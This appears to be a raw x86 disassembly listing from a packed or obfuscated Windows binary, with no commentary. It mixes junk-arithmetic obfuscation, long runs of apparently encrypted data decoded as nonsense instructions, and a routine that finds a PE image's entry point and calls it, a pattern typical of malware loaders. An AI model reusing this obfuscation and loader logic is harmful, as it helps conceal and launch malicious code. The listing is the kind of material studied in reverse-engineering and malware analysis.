  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4336db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433647,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43375f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4336e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433733,0x4336a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43371b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4336af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43371b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4336a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43365f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43365f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43365f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	xchg   esi,eax
  40fae1:	or     ah,BYTE PTR [ecx]
  40fae3:	sub    eax,0x7c7cb33d
  40fae8:	scas   al,BYTE PTR es:[edi]
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fad5
  40faed:	ss pusha 
  40faef:	jmp    0x7de9:0x9616c55b
  40faf6:	out    0x4b,eax
  40faf8:	ret    
  40faf9:	xchg   esp,eax
  40fafa:	and    eax,0x891953f
  40faff:	pop    edx
  40fb00:	jmp    0x40fb31
  40fb02:	mov    ah,0x2d
  40fb04:	arpl   WORD PTR [eax],bx
  40fb06:	(bad)  
  40fb07:	push   ebp
  40fb08:	push   0x72
  40fb0a:	jnp    0x40fb55
  40fb0c:	(bad)  
  40fb0d:	mov    DWORD PTR [edx+0xe],esp
  40fb10:	inc    esi
  40fb11:	mov    ecx,DWORD PTR [ebx+0x30]
  40fb14:	test   al,0xf3
  40fb16:	repnz inc edi
  40fb18:	sub    eax,0x8f1b5afd
  40fb1d:	les    edx,FWORD PTR [edi+0x7d226197]
  40fb23:	sub    ch,BYTE PTR [ebp+0x23167a88]
  40fb29:	sar    DWORD PTR [ebx-0x4ccee285],0xd4
  40fb30:	lods   eax,DWORD PTR ds:[esi]
  40fb31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb32:	cmp    dh,BYTE PTR [ebx+0x18]
  40fb35:	popa   
  40fb36:	popf   
  40fb37:	dec    edi
  40fb38:	in     eax,0xd2
  40fb3a:	aaa    
  40fb3b:	add    DWORD PTR [ecx+ebx*8],edi
  40fb3e:	mov    BYTE PTR [eax-0x1849c057],0xf7
  40fb45:	dec    esp
  40fb46:	jl     0x40fafd
  40fb48:	rcl    BYTE PTR [edi+eiz*8+0x0],0xc2
  40fb4d:	push   ecx
  40fb4e:	cmp    BYTE PTR [edx],dh
  40fb50:	pop    esp
  40fb51:	gs iret 
  40fb53:	and    DWORD PTR [ebx-0x15ed433b],ebx
  40fb59:	adc    esp,0x651694c
  40fb5f:	fadd   QWORD PTR [eax-0x7303ba7]
  40fb65:	mov    esp,0x507427c6
  40fb6a:	pop    ds
  40fb6b:	dec    ebx
  40fb6c:	mov    edx,0x10ee6c87
  40fb71:	inc    esi
  40fb72:	shl    BYTE PTR [esi-0x2b],cl
  40fb75:	inc    ebp
  40fb76:	mov    eax,0x9b78a82f
  40fb7b:	aaa    
  40fb7c:	jbe    0x40fb9d
  40fb7e:	jp     0x40fb93
  40fb80:	loop   0x40fb0e
  40fb82:	sahf   
  40fb83:	scas   eax,DWORD PTR es:[edi]
  40fb84:	mov    WORD PTR [ebx+0x45316cac],?
  40fb8a:	sub    BYTE PTR [ebx+0x5ed3ea3e],al
  40fb90:	das    
  40fb91:	leave  
  40fb92:	or     eax,0xc53ed500
  40fb97:	adc    DWORD PTR [edi+0x1d81f78],0x64
  40fb9e:	test   ecx,ecx
  40fba0:	int3   
  40fba1:	fdivr  QWORD PTR [edx-0x17]
  40fba4:	sbb    DWORD PTR [ecx],ebp
  40fba6:	test   eax,0x559b4169
  40fbab:	xor    DWORD PTR [ecx+esi*2+0x1995a3cd],esi
  40fbb2:	stc    
  40fbb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbb4:	stos   BYTE PTR es:[edi],al
  40fbb5:	retf   0x4941
  40fbb8:	push   ecx
  40fbb9:	xchg   edx,eax
  40fbba:	jbe    0x40fbcb
  40fbbc:	and    edx,eax
  40fbbe:	xchg   DWORD PTR [ecx-0x1a],edi
  40fbc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc2:	retf   0x3b34
  40fbc5:	call   0x87316206
  40fbca:	mov    ebx,DWORD PTR [ecx-0x7b]
  40fbcd:	sbb    ebp,DWORD PTR gs:[ebx+ebp*2-0x22d0a597]
  40fbd5:	sti    
  40fbd6:	aaa    
  40fbd7:	jmp    0x2114:0x93fc97f
  40fbde:	xchg   ebp,eax
  40fbdf:	shl    ebp,cl
  40fbe1:	test   eax,0x28bfa150
  40fbe6:	mov    ah,0x1e
  40fbe8:	lock cmp ah,BYTE PTR [ecx]
  40fbeb:	cs pop ss
  40fbed:	mov    bl,0xda
  40fbef:	jbe    0x40fb7f
  40fbf1:	fstp   QWORD PTR [eax+0x11]
  40fbf4:	cmp    eax,0x2277c17b
  40fbf9:	pusha  
  40fbfa:	in     al,0xb2
  40fbfc:	push   0x76
  40fbfe:	enter  0xfcf2,0x7f
  40fc02:	mov    dh,0x82
  40fc04:	mov    edx,0x43cf2d3d
  40fc09:	js     0x40fbad
  40fc0b:	mov    ebp,0x7ecee34
  40fc10:	loopne 0x40fbda
  40fc12:	std    
  40fc13:	sub    esp,eax
  40fc15:	mov    DWORD PTR [ebx+0x737ba517],edx
  40fc1b:	dec    bl
  40fc1d:	adc    BYTE PTR [edx],al
  40fc1f:	stc    
  40fc20:	mov    ebp,0x48db54ee
  40fc25:	call   0x4a278215
  40fc2a:	lods   eax,DWORD PTR ds:[esi]
  40fc2b:	test   eax,0xb7a2fc5
  40fc30:	idiv   esi
  40fc32:	sbb    BYTE PTR [edx+0x70e31832],dh
  40fc38:	dec    edi
  40fc39:	fadd   QWORD PTR [edx]
  40fc3b:	mov    esi,0xf2f0af3b
  40fc40:	adc    esp,DWORD PTR [esi]
  40fc42:	adc    ah,BYTE PTR [esi+0x8]
  40fc45:	out    dx,eax
  40fc46:	adc    DWORD PTR [ebx-0x3d],edx
  40fc49:	arpl   WORD PTR [ecx],bx
  40fc4b:	inc    esp
  40fc4c:	js     0x40fbcf
  40fc4e:	mov    esp,0x6681d0a9
  40fc53:	repz jo 0x40fc7b
  40fc56:	inc    eax
  40fc57:	pop    edx
  40fc58:	mov    esp,0x30810463
  40fc5d:	mov    ecx,DWORD PTR [esi+0x2e4d4b9f]
  40fc63:	sbb    eax,0xaf2467f4
  40fc68:	mov    bl,0xbc
  40fc6a:	jmp    0xc22d:0x249a26d8
  40fc71:	in     eax,dx
  40fc72:	stos   DWORD PTR es:[edi],eax
  40fc73:	mov    eax,0x2e030da4
  40fc78:	pop    ebp
  40fc79:	add    al,0xe1
  40fc7b:	or     BYTE PTR [edi+ecx*8+0x17644c77],al
  40fc82:	std    
  40fc83:	imul   edx,DWORD PTR [esi-0x1971669a],0xcbcc460b
  40fc8d:	sbb    eax,0x1c9de1fd
  40fc92:	and    bl,BYTE PTR [ebx]
  40fc94:	sub    eax,0xcc90f4a7
  40fc99:	adc    ah,dl
  40fc9b:	les    esp,FWORD PTR [ecx+edx*2-0x710a46dc]
  40fca2:	jge    0x40fc68
  40fca4:	gs push edi
  40fca6:	outs   dx,DWORD PTR ds:[esi]
  40fca7:	mov    ah,0x23
  40fca9:	mov    cl,0x29
  40fcab:	fisub  DWORD PTR [edi+0x821280b]
  40fcb1:	push   cs
  40fcb2:	or     ecx,DWORD PTR [ebp+0x9d7a68e]
  40fcb8:	jle    0x40fc49
  40fcba:	pop    eax
  40fcbb:	cs retf 
  40fcbd:	sub    DWORD PTR [esi-0x2e],edi
  40fcc0:	(bad)  [ebx+0xb]
  40fcc3:	sbb    eax,0xaf0cd3b2
  40fcc8:	push   ecx
  40fcc9:	repnz arpl WORD PTR es:[esi-0x31],di
  40fcce:	or     ah,BYTE PTR [eax-0x2f0f6e56]
  40fcd4:	fdivr  DWORD PTR [edx-0x412cc5f9]
  40fcda:	out    0x1c,eax
  40fcdc:	neg    ecx
  40fcde:	mov    edi,0x27a662bb
  40fce3:	pop    edi
  40fce4:	jp     0x40fcdb
  40fce6:	pop    eax
  40fce7:	icebp  
  40fce8:	cmc    
  40fce9:	xchg   esp,eax
  40fcea:	pop    esp
  40fceb:	adc    eax,0x4b123efb
  40fcf0:	ins    DWORD PTR es:[edi],dx
  40fcf1:	push   ecx
  40fcf2:	adc    esp,DWORD PTR [eax-0x2b54c655]
  40fcf8:	adc    dh,BYTE PTR [esi+0x5fc09143]
  40fcfe:	cmp    al,0x53
  40fd00:	pop    ss
  40fd01:	inc    ebp
  40fd02:	inc    eax
  40fd03:	call   0x4409:0xed0c5eef
  40fd0a:	pop    edx
  40fd0b:	push   esp
  40fd0c:	pop    ebx
  40fd0d:	push   ebx
  40fd0e:	out    0x26,eax
  40fd10:	mov    eax,0xfced2a0e
  40fd15:	push   esi
  40fd16:	fbstp  TBYTE PTR [eax]
  40fd18:	or     ebx,esi
  40fd1a:	xor    eax,0x9c3549b5
  40fd1f:	lods   eax,DWORD PTR ds:[esi]
  40fd20:	adc    BYTE PTR [ebx+0x78a187b9],0x67
  40fd27:	dec    esp
  40fd28:	rcl    BYTE PTR [edx+0x79],cl
  40fd2b:	arpl   bp,ax
  40fd2d:	test   eax,0x5e6d6e2b
  40fd32:	sub    al,0x4c
  40fd34:	push   edx
  40fd35:	mov    ebp,0x7dd12229
  40fd3a:	sbb    esi,DWORD PTR [edi-0x3f8fa591]
  40fd40:	sub    BYTE PTR [edi],dh
  40fd42:	cs leave 
  40fd44:	mov    edx,0xf30b713
  40fd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd4a:	mov    eax,ds:0x45344663
  40fd4f:	xchg   esi,eax
  40fd50:	xchg   ecx,eax
  40fd51:	fs cs sbb eax,0xc55cb61f
  40fd58:	add    DWORD PTR [esi-0x64],ebx
  40fd5b:	pop    esp
  40fd5c:	adc    DWORD PTR ds:0x99990c8c,ecx
  40fd62:	push   ebp
  40fd63:	rcl    ah,cl
  40fd65:	mov    ebx,0xd077fa84
  40fd6a:	xchg   edi,eax
  40fd6b:	sahf   
  40fd6c:	test   BYTE PTR [eax+0x35470027],bh
  40fd72:	jns    0x40fd9f
  40fd74:	and    eax,0xeebd3e44
  40fd79:	mov    DWORD PTR [ecx-0x615499bd],edi
  40fd7f:	out    0x47,al
  40fd81:	pop    eax
  40fd82:	sub    al,BYTE PTR [eax+0x5c38246a]
  40fd88:	cmp    bl,BYTE PTR [ebx-0x19]
  40fd8b:	mov    ds:0xec816225,eax
  40fd90:	adc    eax,0x2abfea8b
  40fd96:	lods   al,BYTE PTR ds:[esi]
  40fd97:	jmp    FWORD PTR [eax+0x31]
  40fd9a:	ja     0x40fd36
  40fd9c:	aaa    
  40fd9d:	push   esi
  40fd9e:	mov    ecx,DWORD PTR [eax]
  40fda0:	adc    DWORD PTR ds:0x43365f,edx
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	dec    esi
  40fdc7:	xor    al,0xa
  40fdc9:	mov    BYTE PTR [edi-0x43],ch
  40fdcc:	jl     0x40fe4a
  40fdce:	scas   al,BYTE PTR es:[edi]
  40fdcf:	jle    0x40fe4d
  40fdd1:	jl     0x40fd5d
  40fdd3:	push   ebx
  40fdd4:	mov    edi,0x53cb38b6
  40fdd9:	sbb    eax,0xa90506a
  40fdde:	mov    bl,0x7a
  40fde0:	popf   
  40fde1:	test   DWORD PTR [edx+0x22],eax
  40fde4:	xchg   al,ch
  40fde6:	jge    0x40fe56
  40fde8:	pop    edi
  40fde9:	dec    ecx
  40fdea:	je     0x40fe68
  40fdec:	dec    ebx
  40fded:	das    
  40fdee:	ror    BYTE PTR [ebx+0x743254c],0x4c
  40fdf5:	jno    0x40fdeb
  40fdf7:	jmp    0x40fe2c
  40fdf9:	inc    edi
  40fdfa:	shl    BYTE PTR [eax],1
  40fdfc:	xchg   ecx,eax
  40fdfd:	push   ds
  40fdfe:	dec    edx
  40fdff:	or     al,0xc5
  40fe01:	jne    0x40fdc7
  40fe03:	(bad)
  40fe06:	mov    eax,0x8655a84c
  40fe0b:	sbb    BYTE PTR [esi+0x439b4c77],ah
  40fe11:	int3   
  40fe12:	push   cs
  40fe13:	xor    eax,ecx
  40fe15:	dec    ebp
  40fe16:	pusha  
  40fe17:	xchg   BYTE PTR [eax-0x283d3c6d],dh
  40fe1d:	push   ecx
  40fe1e:	dec    ebx
  40fe1f:	mov    DWORD PTR [ecx+0x5c23ce48],eax
  40fe25:	scas   eax,DWORD PTR es:[edi]
  40fe26:	pop    ss
  40fe27:	pop    ecx
  40fe28:	xchg   edx,eax
  40fe29:	push   esp
  40fe2a:	leave  
  40fe2b:	xchg   esp,eax
  40fe2c:	in     al,0x5e
  40fe2e:	inc    eax
  40fe2f:	je     0x40fea7
  40fe31:	fucomi st,st(1)
  40fe33:	jo     0x40fe15
  40fe35:	cmp    al,0x97
  40fe37:	xchg   DWORD PTR [eax+0x497afe66],esi
  40fe3d:	xor    BYTE PTR [ecx-0x156d5a07],ah
  40fe43:	pop    edx
  40fe44:	jb     0x40fe6a
  40fe46:	test   al,0xbe
  40fe48:	dec    esi
  40fe49:	jecxz  0x40fe2b
  40fe4b:	mov    BYTE PTR [esi+0x4c],bh
  40fe4e:	xor    al,0xa3
  40fe50:	js     0x40fe44
  40fe52:	mov    eax,0x34c8accf
  40fe57:	in     eax,dx
  40fe58:	pop    es
  40fe59:	dec    esp
  40fe5a:	mov    dl,al
  40fe5c:	clc    
  40fe5d:	ins    BYTE PTR es:[edi],dx
  40fe5e:	sbb    dl,BYTE PTR [edi-0x9]
  40fe61:	in     eax,dx
  40fe62:	jae    0x40fed1
  40fe64:	xchg   dh,ah
  40fe66:	stos   DWORD PTR es:[edi],eax
  40fe67:	fimul  DWORD PTR [esi]
  40fe69:	sbb    bl,BYTE PTR [edx-0x2d]
  40fe6c:	and    ecx,eax
  40fe6e:	ror    BYTE PTR ds:0x2268f824,cl
  40fe74:	(bad)  
  40fe75:	aam    0x14
  40fe77:	xchg   esp,eax
  40fe78:	cmc    
  40fe79:	std    
  40fe7a:	lea    esp,[edx-0x55]
  40fe7d:	daa    
  40fe7e:	jp     0x40fe5c
  40fe80:	retf   
  40fe81:	int3   
  40fe82:	enter  0xe51e,0x7a
  40fe86:	loop   0x40fe3f
  40fe88:	fnstsw WORD PTR [edx+eax*2]
  40fe8b:	jae    0x40fe14
  40fe8d:	shr    DWORD PTR [esp+esi*2],0x1
  40fe91:	leave  
  40fe92:	test   al,0xba
  40fe94:	xchg   DWORD PTR [ebx-0x413627b3],ebx
  40fe9a:	shl    DWORD PTR gs:[eax+eax*2+0x24],1
  40fe9f:	or     DWORD PTR [eax+0x46],ecx
  40fea2:	repz in eax,dx
  40fea4:	arpl   WORD PTR ds:0x37adde3d,si
  40feaa:	pop    ss
  40feab:	and    cl,al
  40fead:	mov    tr2,esi
  40feb0:	mov    ah,0x5
  40feb2:	(bad)  
  40feb3:	mov    al,0xb8
  40feb5:	xchg   BYTE PTR [ecx+esi*8-0x37],cl
  40feb9:	jmp    0x40fe79
  40febb:	xor    eax,DWORD PTR [edx-0x9]
  40febe:	test   DWORD PTR [esi-0x7f],ebp
  40fec1:	enter  0x9ca5,0xe9
  40fec5:	clc    
  40fec6:	mov    DWORD PTR [ecx+0x49],edx
  40fec9:	int3   
  40feca:	cli    
  40fecb:	xchg   DWORD PTR [ecx+0x66],ecx
  40fece:	fstp   TBYTE PTR [edx+0x63475bcc]
  40fed4:	and    al,0x82
  40fed6:	mov    bl,0x17
  40fed8:	retf   
  40fed9:	repz mov al,0xbb
  40fedc:	(bad)  
  40fedd:	mov    bl,0x94
  40fedf:	mov    bh,0xe0
  40fee1:	dec    ebp
  40fee2:	push   0x53
  40fee4:	xor    BYTE PTR [ecx+0x3d],al
  40fee7:	cmp    eax,0x526023db
  40feec:	(bad)  
  40feed:	mov    al,es:0x635d7721
  40fef3:	xor    BYTE PTR [edi+eax*2+0x7f],al
  40fef7:	aad    0xb9
  40fef9:	cmove  esp,DWORD PTR [ebx+ecx*2]
  40fefd:	fild   WORD PTR [esp+ebp*8+0x2e]
  40ff01:	adc    al,0x70
  40ff03:	popa   
  40ff04:	add    dh,BYTE PTR [ebp+0x72]
  40ff07:	outs   dx,DWORD PTR ds:[esi]
  40ff08:	in     al,dx
  40ff09:	and    BYTE PTR [ebx+0x3f],0x91
  40ff0d:	sahf   
  40ff0e:	int    0x62
  40ff10:	or     al,0x8b
  40ff12:	addr16 add eax,0xf22563f3
  40ff18:	lds    esp,FWORD PTR [eax]
  40ff1a:	ret    
  40ff1b:	jmp    0x467c02fd
  40ff20:	retf   
  40ff21:	xchg   esp,ebx
  40ff23:	and    ch,BYTE PTR [esi-0x68]
  40ff26:	nop
  40ff27:	push   ss
  40ff28:	nop
  40ff29:	sbb    BYTE PTR [edi*1-0x691642b5],ah
  40ff30:	sub    DWORD PTR [esi],0xb2e7bedd
  40ff36:	out    dx,eax
  40ff37:	xor    ch,bh
  40ff39:	(bad)  [esi]
  40ff3b:	jl     0x40ff39
  40ff3d:	or     DWORD PTR [ecx+ebx*2],esi
  40ff40:	frstor [esi+0x62]
  40ff43:	(bad)  
  40ff44:	loop   0x40ffac
  40ff46:	sbb    cl,BYTE PTR [ebx+ebp*2+0xd]
  40ff4a:	cmc    
  40ff4b:	out    0xc,eax
  40ff4d:	nop
  40ff4e:	mov    esi,0x55ab6fa
  40ff53:	dec    ebp
  40ff54:	lods   eax,DWORD PTR ds:[esi]
  40ff55:	inc    ebx
  40ff56:	(bad)  
  40ff57:	sbb    bh,BYTE PTR [edi-0x42]
  40ff5a:	(bad)  
  40ff5b:	data16 sbb dh,BYTE PTR ss:[edi+0x610487bf]
  40ff63:	ret    
  40ff64:	pop    ds
  40ff65:	pop    es
  40ff66:	pop    ebp
  40ff67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff68:	jne    0x40ff67
  40ff6a:	js     0x40ff53
  40ff6c:	cmc    
  40ff6d:	or     eax,ebx
  40ff6f:	xor    cl,BYTE PTR [edx+0x1d52da9f]
  40ff75:	or     DWORD PTR [esi],ebp
  40ff77:	rcr    BYTE PTR [esi-0x35],0xb5
  40ff7b:	push   ebx
  40ff7c:	push   ecx
  40ff7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff7e:	push   ds
  40ff7f:	fidivr WORD PTR [edi+0x47e2da16]
  40ff85:	dec    edx
  40ff86:	or     DWORD PTR [edi-0x6a],esi
  40ff89:	dec    esp
  40ff8a:	or     ch,ah
  40ff8c:	fdiv   DWORD PTR [eax+0x47]
  40ff8f:	pop    esi
  40ff90:	mov    ecx,0xefcccc13
  40ff95:	ds xor eax,0xf8de32e2
  40ff9b:	xchg   BYTE PTR [esi+0x19],bl
  40ff9e:	jmp    0xc249:0x22dcb2b6
  40ffa5:	jae    0x40ff40
  40ffa7:	mov    al,ds:0x1ae90b24
  40ffac:	xor    eax,0x8e873b27
  40ffb1:	push   ds
  40ffb2:	call   0xd97a:0xc76af81e
  40ffb9:	mov    dl,0x55
  40ffbb:	cmp    DWORD PTR es:[edi],ebp
  40ffbe:	sub    DWORD PTR [eax-0xa],esp
  40ffc1:	fisubr DWORD PTR [eax+edi*8+0x1ca9b2c]
  40ffc8:	and    BYTE PTR [edx-0x7e47ffbf],ah
  40ffce:	and    BYTE PTR [ebp-0x7dcae227],ch
  40ffd4:	mov    ss,WORD PTR [edx+0x7b8fdcda]
  40ffda:	aaa    
  40ffdb:	mov    dl,BYTE PTR [ebx]
  40ffdd:	stc    
  40ffde:	call   0xe02843f4
  40ffe3:	icebp  
  40ffe4:	inc    eax
  40ffe5:	test   eax,0xc0a1a5c5
  40ffea:	pop    esi
  40ffeb:	aas    
  40ffec:	pop    ebx
  40ffed:	pop    ebp
  40ffee:	outs   dx,DWORD PTR ds:[esi]
  40ffef:	cmp    bh,BYTE PTR [edx-0x4c1f016a]
  40fff5:	aaa    
  40fff6:	mov    dl,0x4d
  40fff8:	mov    BYTE PTR [ebp+0x378348f6],bh
  40fffe:	dec    ebx
  40ffff:	shl    dl,1
  410001:	jne    0x410015
  410003:	fsub   QWORD PTR ds:0x38aa3754
  410009:	sbb    al,0x23
  41000b:	dec    esi
  41000c:	sub    al,0x6e
  41000e:	push   esp
  41000f:	mov    al,0xbd
  410011:	or     BYTE PTR [ecx],ah
  410013:	ins    BYTE PTR es:[edi],dx
  410014:	jne    0x40ffa4
  410016:	push   ebp
  410017:	inc    eax
  410018:	xchg   ecx,eax
  410019:	(bad)  
  41001a:	(bad)  
  41001b:	dec    esp
  41001c:	sbb    cl,ah
  41001e:	outs   dx,DWORD PTR ds:[esi]
  41001f:	cwde   
  410020:	cmp    eax,0x4c8c83ea
  410025:	mov    eax,ds:0x63e1bf7e
  41002a:	lahf   
  41002b:	jae    0x40ffcf
  41002d:	ins    DWORD PTR es:[edi],dx
  41002e:	adc    bl,bl
  410030:	inc    edx
  410031:	idiv   BYTE PTR [eax+0x16]
  410034:	and    esi,DWORD PTR [edx-0xe]
  410037:	mov    ebp,0x6eb8c17a
  41003c:	xchg   BYTE PTR [edx-0x2a37cbd6],al
  410042:	mov    ebp,0x511a9975
  410047:	scas   al,BYTE PTR es:[edi]
  410048:	fnsave [ecx-0x3a]
  41004b:	inc    ebx
  41004c:	pop    esp
  41004d:	inc    bp
  41004f:	stos   DWORD PTR es:[edi],eax
  410050:	fnsave [ebx+edx*8]
  410053:	xchg   ebp,eax
  410054:	repnz inc edi
  410056:	stc    
  410057:	dec    esi
  410058:	and    ch,dh
  41005a:	mov    al,ds:0x1219e529
  41005f:	(bad)  
  410060:	rol    DWORD PTR [eax+0x30],1
  410063:	push   ebp
  410064:	jne    0x410079
  410066:	dec    ebp
  410067:	rcr    BYTE PTR [edx+ebx*4],0xf7
  41006b:	addr16 ret 0x107b
  41006f:	pop    eax
  410070:	test   al,0x97
  410072:	mov    dl,0x8b
  410074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410075:	push   ecx
  410076:	mov    ebp,cs
  410078:	or     esi,0xffffffa2
  41007b:	jl     0x410031
  41007d:	lahf   
  41007e:	(bad)
  410083:	inc    ebp
  410084:	mov    eax,DWORD PTR [ebp+0x10]
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4336df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4336df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4336df,eax
  4100dc:	cmp    DWORD PTR ds:0x4336df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4336df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4336df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4336df
  410111:	inc    eax
  410112:	mov    ds:0x4336df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433773
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433657,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4336df,0x4336e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43364f,0x433647
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4336e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433723,0x433757
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433757,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433697
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433723,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433657,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433777
  4101b6:	mov    esi,DWORD PTR ds:0x43378b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433663,0x43369b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433733,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433733
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433733,ecx
  4101f0:	cmp    DWORD PTR ds:0x433733,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433914
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433733,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433763,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433757,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433757
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433757,ecx
  41026d:	cmp    DWORD PTR ds:0x433757,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433757,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433757
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433757,ecx
  4102a4:	cmp    DWORD PTR ds:0x433757,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433723,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433723
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433723,ecx
  4102d3:	cmp    DWORD PTR ds:0x433723,0x22
